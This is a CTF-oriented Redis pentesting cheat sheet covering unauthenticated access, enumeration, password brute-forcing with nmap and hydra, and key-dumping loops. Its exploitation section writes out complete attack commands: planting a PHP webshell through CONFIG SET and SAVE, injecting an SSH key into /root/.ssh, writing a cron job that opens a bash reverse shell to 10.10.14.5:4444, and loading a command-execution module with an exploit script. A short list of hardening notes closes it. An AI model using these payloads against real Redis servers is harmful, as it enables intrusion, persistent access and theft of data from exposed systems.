> **Redis** (Remote Dictionary Server) is an in-memory key-value data store that runs on **port 6379**. By default it has **no authentication**, making it a high-value target for RCE and data exfiltration in CTFs.

---

## Quickstart — Unauthenticated Access

```bash
# Test if Redis accepts unauthenticated connections
$ redis-cli -h 10.129.1.10
10.129.1.10:6379> PING
PONG                    # ✅ no auth required

# Or with netcat (raw Redis protocol)
$ echo "PING" | nc -w 2 10.129.1.10 6379
+PONG
```

**If you get `NOAUTH Authentication required`, the server has a password. Try:**
```bash
redis-cli -h 10.129.1.10 -a password
# Or after connecting:
10.129.1.10:6379> AUTH password
```

---

## Basic Enumeration

```bash
$ redis-cli -h 10.129.1.10

# Server info — OS, version, uptime, clients, memory
10.129.1.10:6379> INFO
10.129.1.10:6379> INFO keyspace          # databases with keys
10.129.1.10:6379> INFO server           # Redis version, OS
10.129.1.10:6379> INFO clients          # connected clients
10.129.1.10:6379> INFO memory           # memory usage

# Configuration dump
10.129.1.10:6379> CONFIG GET *
10.129.1.10:6379> CONFIG GET dir        # working directory
10.129.1.10:6379> CONFIG GET dbfilename # dump filename
10.129.1.10:6379> CONFIG GET requirepass
10.129.1.10:6379> CONFIG GET slave-read-only

# Database navigation & dumping
10.129.1.10:6379> SELECT 0              # switch DB (0-15 default)
10.129.1.10:6379> DBSIZE                # number of keys in current DB
10.129.1.10:6379> KEYS *                # all keys (slow on large DBs)
10.129.1.10:6379> SCAN 0                # cursor-based iteration (safer)
10.129.1.10:6379> TYPE <key>            # string, list, set, hash, zset
10.129.1.10:6379> GET <key>             # read a string value
10.129.1.10:6379> MGET <k1> <k2>        # read multiple keys
10.129.1.10:6379> LRANGE <key> 0 -1     # read entire list
10.129.1.10:6379> SMEMBERS <key>        # read all set members
10.129.1.10:6379> HGETALL <key>         # read all hash fields
10.129.1.10:6379> ZRANGE <key> 0 -1     # read sorted set

# Client list (who else is connected)
10.129.1.10:6379> CLIENT LIST

# Lua script execution
10.129.1.10:6379> EVAL "return 'hello'" 0
```

---

## Redis Commands Cheat Sheet

| Command | What it does |
| :------ | :----------- |
| `PING` | Test connectivity |
| `INFO` | Server statistics + metadata |
| `INFO keyspace` | Databases and key counts |
| `CONFIG GET *` | Dump entire server config |
| `CONFIG SET <k> <v>` | Modify runtime config |
| `SELECT <0-15>` | Switch database |
| `KEYS *` | List all keys (⚠️ blocks on large DBs) |
| `SCAN 0` | Cursor-based key iteration |
| `DBSIZE` | Key count in current DB |
| `GET <key>` | Read string value |
| `SET <key> <value>` | Set string value |
| `MGET <k1> <k2>` | Read multiple keys |
| `TYPE <key>` | Get key data type |
| `TTL <key>` | Time-to-live in seconds |
| `EXISTS <key>` | Check if key exists |
| `DEL <key>` | Delete a key |
| `FLUSHALL` | Delete ALL keys (all DBs) |
| `FLUSHDB` | Delete keys in current DB |
| `SAVE` | Force synchronous save to disk |
| `BGSAVE` | Async background save |
| `CLIENT LIST` | List connected clients |
| `COMMAND INFO <cmd>` | Command metadata |
| `MONITOR` | Real-time stream of all commands |
| `SLAVEOF <host> <port>` | Replicate from master |
| `MODULE LOAD /path/to.so` | Load a Redis module |
| `AUTH <password>` | Authenticate |
| `EVAL "lua" 0` | Execute Lua script |

---

## Useful Nmap Scripts

```bash
# Detect Redis + check if no auth required
nmap --script redis-info -p6379 10.129.1.10

# Brute force Redis password
nmap --script redis-brute -p6379 10.129.1.10
```

---

## Response Prefixes — What You'll See Over Netcat

| Prefix | Meaning |
| :----- | :------ |
| `+OK` | Success ✅ |
| `-ERR` | Error (e.g., `-NOAUTH Authentication required`) |
| `:1` | Integer reply |
| `$5` | Bulk string (length follows) |
| `*3` | Array (element count follows) |
| `$-1` | Null bulk string (key doesn't exist / nil) |

---

## Exploitation — RCE via Redis

Redis can write arbitrary files to disk via `SAVE`/`BGSAVE` — this is the core CTF exploit.

### Method 1: Webshell (if web server directory is writable)

```bash
$ redis-cli -h 10.129.1.10
10.129.1.10:6379> CONFIG SET dir /var/www/html/
10.129.1.10:6379> CONFIG SET dbfilename shell.php
10.129.1.10:6379> SET payload "<?php system($_GET['cmd']); ?>"
10.129.1.10:6379> SAVE

# Trigger: http://10.129.1.10/shell.php?cmd=id
```

### Method 2: SSH Key (if `/root/.ssh` or `/home/*/.ssh` is writable)

```bash
# Generate keypair on attacker
$ ssh-keygen -t rsa -f redis_key -N ''

# Inject the public key into Redis via stdin
$ (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") | redis-cli -h 10.129.1.10 -x SET payload

# Point Redis at the SSH directory and flush to disk
$ redis-cli -h 10.129.1.10
10.129.1.10:6379> CONFIG SET dir /root/.ssh/
10.129.1.10:6379> CONFIG SET dbfilename authorized_keys
10.129.1.10:6379> SAVE

# Connect
$ ssh -i redis_key root@10.129.1.10
```

### Method 3: Crontab (reverse shell)

```bash
$ redis-cli -h 10.129.1.10
10.129.1.10:6379> CONFIG SET dir /var/spool/cron/crontabs/
10.129.1.10:6379> CONFIG SET dbfilename root
10.129.1.10:6379> SET payload "\n\n* * * * * bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\n\n"
10.129.1.10:6379> SAVE
```

### Method 4: Module Load (Redis >= 4.0)

> ⚠️ El approach SET + SAVE no funciona para `.so` — el RDB binario corrompe el ELF. Se necesita replicación master-slave o `redis-cli --pipe` para escribir un archivo limpio.

```bash
# 1. Compile the RCE module
$ git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
$ cd RedisModules-ExecuteCommand && make

# 2. Use the included exploit script (handles upload + load automatically)
$ python3 redis-master.py -r 10.129.1.10 -p 6379 -L 10.10.14.5 -P 4444 -f module.so -c "id"

# 3. Or manually via replication trick:
#    SLAVEOF attacker-IP 6379 → attacker sends crafted RDB → MODULE LOAD
```

> [RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) — pre-built RCE module.

---

## Automation & One-liners

### Dump all keys from all databases

```bash
for db in $(seq 0 15); do
  echo "=== DB $db ==="
  redis-cli -h 10.129.1.10 -n $db KEYS '*'
done
```

### Dump keys + values with scan (no blocking)

```bash
redis-cli -h 10.129.1.10 --scan | while read key; do
  echo "--- $key ---"
  redis-cli -h 10.129.1.10 GET "$key"
done
```

### Mass-write webshell one-liner

```bash
redis-cli -h 10.129.1.10 <<EOF
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET cmd "<?php system(\$_GET['c']);?>"
SAVE
EOF
```

### Nmap quick enum

```bash
nmap -sV -p6379 --script redis-info 10.129.1.10
```

### Brute force with hydra

```bash
hydra -P /usr/share/wordlists/rockyou.txt redis://10.129.1.10
```

---

## Redis Security Notes

- **No auth by default** — Redis listens on `0.0.0.0:6379` with no password unless explicitly configured
- `protected-mode yes` (Redis ≥ 3.2) blocks external connections, but can be bypassed if the admin binds `0.0.0.0`
- `CONFIG SET` can be disabled with `rename-command CONFIG ""` in `redis.conf`
- Writing via `SAVE`/`BGSAVE` prepends binary RDB data — but most parsers (PHP, cron, SSH) tolerate it
- Modern Redis (6+) supports **ACLs** (`ACL LIST`, `ACL WHOAMI`)

---

## References

- [Redis Official Documentation](https://redis.io/docs/latest/commands/)
- [HackTricks — Pentesting Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
- [RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)
- [Redis RCE — Packet Storm](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)
